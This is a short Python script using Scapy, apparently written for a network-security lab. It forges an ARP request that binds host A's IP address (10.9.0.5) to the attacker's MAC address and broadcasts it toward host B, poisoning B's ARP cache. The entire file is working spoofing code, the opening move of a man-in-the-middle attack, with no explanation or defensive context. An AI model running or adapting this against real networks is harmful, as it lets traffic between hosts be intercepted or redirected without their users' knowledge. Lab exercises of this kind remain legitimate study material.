#!/usr/bin/python3
from scapy.all import *
# M
src_mac='02:42:0a:09:00:69'
dst_mac='00:00:00:00:00:00' 
dst_mac_eth='ff:ff:ff:ff:ff:ff'
src_ip='10.9.0.5' # A
dst_ip='10.9.0.6' # B 
eth = Ether(src=src_mac,dst=dst_mac_eth) 
arp = ARP(hwsrc=src_mac, psrc=src_ip, hwdst=dst_mac, pdst=dst_ip, op=1)
pkt = eth / arp
sendp(pkt)
